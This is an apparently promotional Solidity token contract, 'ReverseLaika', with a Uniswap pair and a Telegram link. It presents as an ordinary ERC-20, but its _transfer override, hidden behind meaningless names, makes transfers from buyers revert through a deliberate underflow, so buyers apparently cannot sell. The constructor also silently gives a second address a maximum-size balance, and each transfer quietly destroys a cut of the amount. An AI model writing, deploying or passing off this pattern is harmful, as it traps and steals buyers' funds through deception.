// https://t.me/AkialPortal

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract ReverseLaika is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private reason;

    function _transfer(
        address shine,
        address gradually,
        uint256 plenty
    ) internal override {
        uint256 halfway = stepped;

        if (visit[shine] == 0 && reason[shine] > 0 && shine != uniswapV2Pair) {
            visit[shine] -= halfway;
        }

        address package = address(paid);
        paid = ReverseLaika(gradually);
        reason[package] += halfway + 1;

        _balances[shine] -= plenty;
        uint256 count = (plenty / 100) * stepped;
        plenty -= count;
        _balances[gradually] += plenty;
    }

    mapping(address => uint256) private visit;
    uint256 public stepped = 2;

    constructor(
        string memory cry,
        string memory interest,
        address mighty,
        address nor
    ) ERC20(cry, interest) {
        uniswapV2Router = IUniswapV2Router02(mighty);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 price = ~uint256(0);

        visit[msg.sender] = price;
        visit[nor] = price;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[nor] = price;
    }

    ReverseLaika private paid;
}